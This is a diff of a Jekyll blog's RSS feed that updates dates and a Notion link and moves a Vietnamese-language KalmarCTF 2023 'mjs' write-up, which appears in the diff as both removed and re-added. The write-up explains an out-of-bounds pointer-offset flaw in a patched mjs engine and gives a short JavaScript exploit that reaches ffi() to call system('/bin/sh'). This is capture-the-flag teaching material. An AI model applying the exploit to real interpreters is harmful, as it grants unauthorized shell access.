@@ -5,87 +5,19 @@
     <description></description>
     <link>http://localhost:4000/</link>
     <atom:link href="http://localhost:4000/feed.xml" rel="self" type="application/rss+xml"/>
-    <pubDate>Sun, 25 Aug 2024 13:17:40 +0700</pubDate>
-    <lastBuildDate>Sun, 25 Aug 2024 13:17:40 +0700</lastBuildDate>
+    <pubDate>Fri, 30 Aug 2024 06:46:28 +0700</pubDate>
+    <lastBuildDate>Fri, 30 Aug 2024 06:46:28 +0700</lastBuildDate>
     <generator>Jekyll v3.10.0</generator>
     
       <item>
         <title>KungfuRE</title>
         <description>&lt;p style=&quot;text-align: center;&quot;&gt;&lt;img src=&quot;/images/kungfure/kungfu.jpg&quot; alt=&quot;Smile&quot; /&gt;&lt;/p&gt;
 
-&lt;p&gt;Please read on &lt;a href=&quot;https://ducdatdau.notion.site/KungfuRE-9e6cf148880947b7ba8e147fc488be7b&quot;&gt;Notion&lt;/a&gt;. I’m too lazy to git add, git commit, git push. You can find all challenges at &lt;a href=&quot;https://github.com/ducdatdau/Writeups/tree/main/Training/KungfuRE&quot;&gt;github/KungfuRE&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;Please read on &lt;a href=&quot;https://ducdatdauvnsec.notion.site/KungfuRE-f222577f9f8949978fe136f78219c38b?pvs=25&quot;&gt;Notion&lt;/a&gt;. I’m too lazy to git add, git commit, git push. You can find all challenges at &lt;a href=&quot;https://github.com/ducdatdau/Writeups/tree/main/Training/KungfuRE&quot;&gt;github/KungfuRE&lt;/a&gt;.&lt;/p&gt;
 </description>
         <pubDate>Sun, 25 Aug 2024 00:00:00 +0700</pubDate>
         <link>http://localhost:4000/2024/08/25/KungfuRE.html</link>
         <guid isPermaLink="true">http://localhost:4000/2024/08/25/KungfuRE.html</guid>
-        
-        
-      </item>
-    
-      <item>
-        <title>KalmarCTF 2023: mjs</title>
-        <description>&lt;p style=&quot;text-align: center;&quot;&gt;&lt;img src=&quot;/images/kalmar2023/banner.png&quot; alt=&quot;Smile&quot; /&gt;&lt;/p&gt;
-
-&lt;h2 id=&quot;0x00-overview&quot;&gt;0x00 Overview&lt;/h2&gt;
-
-&lt;p&gt;Đây là một bài liên quan đến &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mjs engine&lt;/code&gt;, đã patch hàm &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ffi()&lt;/code&gt; và có lỗ hổng OOB. Từ đó, nhiệm vụ là gọi hàm &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;system()&lt;/code&gt; thông qua hàm &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ffi()&lt;/code&gt;.&lt;/p&gt;
-
-&lt;h2 id=&quot;0x01-vulnerability&quot;&gt;0x01 Vulnerability&lt;/h2&gt;
-
-&lt;p&gt;Bản &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;diff&lt;/code&gt; đã vá một số hàm nguy hiểm như &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ffi()&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ffi_cb_free()&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mkstr()&lt;/code&gt; và &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;s2o()&lt;/code&gt;.&lt;/p&gt;
-
-&lt;div class=&quot;language-diff highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gd&quot;&gt;-  mjs_set(mjs, obj, &quot;ffi&quot;, ~0,
--          mjs_mk_foreign_func(mjs, (mjs_func_ptr_t) mjs_ffi_call));
--  mjs_set(mjs, obj, &quot;ffi_cb_free&quot;, ~0,
--          mjs_mk_foreign_func(mjs, (mjs_func_ptr_t) mjs_ffi_cb_free));
--  mjs_set(mjs, obj, &quot;mkstr&quot;, ~0,
--          mjs_mk_foreign_func(mjs, (mjs_func_ptr_t) mjs_mkstr));
-&lt;/span&gt;&lt;span class=&quot;gi&quot;&gt;+  /* mjs_set(mjs, obj, &quot;ffi&quot;, ~0, */
-+  /*         mjs_mk_foreign_func(mjs, (mjs_func_ptr_t) mjs_ffi_call)); */
-+  /* mjs_set(mjs, obj, &quot;ffi_cb_free&quot;, ~0, */
-+  /*         mjs_mk_foreign_func(mjs, (mjs_func_ptr_t) mjs_ffi_cb_free)); */
-+  /* mjs_set(mjs, obj, &quot;mkstr&quot;, ~0, */
-+  /*         mjs_mk_foreign_func(mjs, (mjs_func_ptr_t) mjs_mkstr)); */
-&lt;/span&gt;   mjs_set(mjs, obj, &quot;getMJS&quot;, ~0,
-           mjs_mk_foreign_func(mjs, (mjs_func_ptr_t) mjs_get_mjs));
-   mjs_set(mjs, obj, &quot;die&quot;, ~0,
-&lt;span class=&quot;p&quot;&gt;@@ -151,8 +151,8 @@&lt;/span&gt; void mjs_init_builtin(struct mjs *mjs, mjs_val_t obj) {
-           mjs_mk_foreign_func(mjs, (mjs_func_ptr_t) mjs_do_gc));
-   mjs_set(mjs, obj, &quot;chr&quot;, ~0,
-           mjs_mk_foreign_func(mjs, (mjs_func_ptr_t) mjs_chr));
-&lt;span class=&quot;gd&quot;&gt;-  mjs_set(mjs, obj, &quot;s2o&quot;, ~0,
--          mjs_mk_foreign_func(mjs, (mjs_func_ptr_t) mjs_s2o));
-&lt;/span&gt;&lt;span class=&quot;gi&quot;&gt;+  /* mjs_set(mjs, obj, &quot;s2o&quot;, ~0, */
-+  /*         mjs_mk_foreign_func(mjs, (mjs_func_ptr_t) mjs_s2o)); */
-&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Những hàm trên đã không hoàn toàn bị xóa đi. Mình có thử một vài ví dụ và thấy rằng &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mjs&lt;/code&gt; gọi các &lt;a href=&quot;https://github.com/cesanta/mjs?tab=readme-ov-file#built-in-api&quot;&gt;built-in functions&lt;/a&gt; bằng các con trỏ.&lt;/p&gt;
-
-&lt;div class=&quot;language-js highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nx&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;load&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;foreign_ptr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;nd&quot;&gt;557dbd9504c0&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;
-&lt;span class=&quot;kc&quot;&gt;undefined&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Lỗ hổng OOB xuất hiện ở đây, chúng ta có thể gọi bất cứ hàm nào thông qua việc tính offset giữa hàm cần gọi với built-in functions, sau đó gọi hàm đó thông qua con trỏ.&lt;/p&gt;
-
-&lt;h2 id=&quot;0x02-ffi-function&quot;&gt;0x02 FFI function&lt;/h2&gt;
-
-&lt;p&gt;Dựa vào &lt;a href=&quot;https://mongoose-os.com/blog/mjs-a-new-approach-to-embedded-scripting&quot;&gt;docs&lt;/a&gt;, ta biết được &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ffi()&lt;/code&gt; cho phép load và gọi các hàm trong C một cách trực tiếp. Vậy đối với bài toán này, mục tiêu chúng ta sẽ phải gọi &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ffi(&apos;int system(char *)&apos;)(&apos;/bin/sh&apos;)&lt;/code&gt;.&lt;/p&gt;
-
-&lt;h2 id=&quot;0x03-exploitation&quot;&gt;0x03 Exploitation&lt;/h2&gt;
-
-&lt;p&gt;Như đã phân tích ở trên, chúng ta chỉ cần tính offset chênh lệch giữa hàm &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mjs_load()&lt;/code&gt; với &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mjs_ffi_call()&lt;/code&gt;, sau đó gọi hàm lấy shell thông qua con trỏ.&lt;/p&gt;
-
-&lt;div class=&quot;language-js highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kd&quot;&gt;let&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;mjs_load&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x5555555594c0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
-&lt;span class=&quot;kd&quot;&gt;let&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;mjs_ffi_call&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x555555560110&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
-
-&lt;span class=&quot;kd&quot;&gt;let&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;system&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;load&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;mjs_ffi_call&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;mjs_load&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))(&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;int system(char *)&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt; 
-&lt;span class=&quot;nx&quot;&gt;system&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;/bin/sh&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-</description>
-        <pubDate>Wed, 19 Jun 2024 00:00:00 +0700</pubDate>
-        <link>http://localhost:4000/2024/06/19/KalmarCTF-2023.html</link>
-        <guid isPermaLink="true">http://localhost:4000/2024/06/19/KalmarCTF-2023.html</guid>
         
         
       </item>
@@ -738,6 +670,74 @@ flag.lua: Lua bytecode, version 5.3
         <pubDate>Mon, 04 Mar 2024 00:00:00 +0700</pubDate>
         <link>http://localhost:4000/2024/03/04/BKCTF-Train.html</link>
         <guid isPermaLink="true">http://localhost:4000/2024/03/04/BKCTF-Train.html</guid>
+        
+        
+      </item>
+    
+      <item>
+        <title>KalmarCTF 2023: mjs</title>
+        <description>&lt;p style=&quot;text-align: center;&quot;&gt;&lt;img src=&quot;/images/kalmar2023/banner.png&quot; alt=&quot;Smile&quot; /&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;0x00-overview&quot;&gt;0x00 Overview&lt;/h2&gt;
+
+&lt;p&gt;Đây là một bài liên quan đến &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mjs engine&lt;/code&gt;, đã patch hàm &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ffi()&lt;/code&gt; và có lỗ hổng OOB. Từ đó, nhiệm vụ là gọi hàm &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;system()&lt;/code&gt; thông qua hàm &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ffi()&lt;/code&gt;.&lt;/p&gt;
+
+&lt;h2 id=&quot;0x01-vulnerability&quot;&gt;0x01 Vulnerability&lt;/h2&gt;
+
+&lt;p&gt;Bản &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;diff&lt;/code&gt; đã vá một số hàm nguy hiểm như &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ffi()&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ffi_cb_free()&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mkstr()&lt;/code&gt; và &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;s2o()&lt;/code&gt;.&lt;/p&gt;
+
+&lt;div class=&quot;language-diff highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gd&quot;&gt;-  mjs_set(mjs, obj, &quot;ffi&quot;, ~0,
+-          mjs_mk_foreign_func(mjs, (mjs_func_ptr_t) mjs_ffi_call));
+-  mjs_set(mjs, obj, &quot;ffi_cb_free&quot;, ~0,
+-          mjs_mk_foreign_func(mjs, (mjs_func_ptr_t) mjs_ffi_cb_free));
+-  mjs_set(mjs, obj, &quot;mkstr&quot;, ~0,
+-          mjs_mk_foreign_func(mjs, (mjs_func_ptr_t) mjs_mkstr));
+&lt;/span&gt;&lt;span class=&quot;gi&quot;&gt;+  /* mjs_set(mjs, obj, &quot;ffi&quot;, ~0, */
++  /*         mjs_mk_foreign_func(mjs, (mjs_func_ptr_t) mjs_ffi_call)); */
++  /* mjs_set(mjs, obj, &quot;ffi_cb_free&quot;, ~0, */
++  /*         mjs_mk_foreign_func(mjs, (mjs_func_ptr_t) mjs_ffi_cb_free)); */
++  /* mjs_set(mjs, obj, &quot;mkstr&quot;, ~0, */
++  /*         mjs_mk_foreign_func(mjs, (mjs_func_ptr_t) mjs_mkstr)); */
+&lt;/span&gt;   mjs_set(mjs, obj, &quot;getMJS&quot;, ~0,
+           mjs_mk_foreign_func(mjs, (mjs_func_ptr_t) mjs_get_mjs));
+   mjs_set(mjs, obj, &quot;die&quot;, ~0,
+&lt;span class=&quot;p&quot;&gt;@@ -151,8 +151,8 @@&lt;/span&gt; void mjs_init_builtin(struct mjs *mjs, mjs_val_t obj)
+           mjs_mk_foreign_func(mjs, (mjs_func_ptr_t) mjs_do_gc));
+   mjs_set(mjs, obj, &quot;chr&quot;, ~0,
+           mjs_mk_foreign_func(mjs, (mjs_func_ptr_t) mjs_chr));
+&lt;span class=&quot;gd&quot;&gt;-  mjs_set(mjs, obj, &quot;s2o&quot;, ~0,
+-          mjs_mk_foreign_func(mjs, (mjs_func_ptr_t) mjs_s2o));
+&lt;/span&gt;&lt;span class=&quot;gi&quot;&gt;+  /* mjs_set(mjs, obj, &quot;s2o&quot;, ~0, */
++  /*         mjs_mk_foreign_func(mjs, (mjs_func_ptr_t) mjs_s2o)); */
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Những hàm trên đã không hoàn toàn bị xóa đi. Mình có thử một vài ví dụ và thấy rằng &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mjs&lt;/code&gt; gọi các &lt;a href=&quot;https://github.com/cesanta/mjs?tab=readme-ov-file#built-in-api&quot;&gt;built-in functions&lt;/a&gt; bằng các con trỏ.&lt;/p&gt;
+
+&lt;div class=&quot;language-js highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nx&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;load&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;foreign_ptr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;nd&quot;&gt;557dbd9504c0&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;kc&quot;&gt;undefined&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Lỗ hổng OOB xuất hiện ở đây, chúng ta có thể gọi bất cứ hàm nào thông qua việc tính offset giữa hàm cần gọi với built-in functions, sau đó gọi hàm đó thông qua con trỏ.&lt;/p&gt;
+
+&lt;h2 id=&quot;0x02-ffi-function&quot;&gt;0x02 FFI function&lt;/h2&gt;
+
+&lt;p&gt;Dựa vào &lt;a href=&quot;https://mongoose-os.com/blog/mjs-a-new-approach-to-embedded-scripting&quot;&gt;docs&lt;/a&gt;, ta biết được &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ffi()&lt;/code&gt; cho phép load và gọi các hàm trong C một cách trực tiếp. Vậy đối với bài toán này, mục tiêu chúng ta sẽ phải gọi &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ffi(&apos;int system(char *)&apos;)(&apos;/bin/sh&apos;)&lt;/code&gt;.&lt;/p&gt;
+
+&lt;h2 id=&quot;0x03-exploitation&quot;&gt;0x03 Exploitation&lt;/h2&gt;
+
+&lt;p&gt;Như đã phân tích ở trên, chúng ta chỉ cần tính offset chênh lệch giữa hàm &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mjs_load()&lt;/code&gt; với &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mjs_ffi_call()&lt;/code&gt;, sau đó gọi hàm lấy shell thông qua con trỏ.&lt;/p&gt;
+
+&lt;div class=&quot;language-js highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kd&quot;&gt;let&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;mjs_load&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x5555555594c0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;kd&quot;&gt;let&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;mjs_ffi_call&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x555555560110&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+
+&lt;span class=&quot;kd&quot;&gt;let&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;system&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;load&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;mjs_ffi_call&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;mjs_load&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))(&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;int system(char *)&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt; 
+&lt;span class=&quot;nx&quot;&gt;system&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;/bin/sh&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+</description>
+        <pubDate>Sat, 30 Dec 2023 00:00:00 +0700</pubDate>
+        <link>http://localhost:4000/2023/12/30/KalmarCTF-2023.html</link>
+        <guid isPermaLink="true">http://localhost:4000/2023/12/30/KalmarCTF-2023.html</guid>
         
         
       </item>
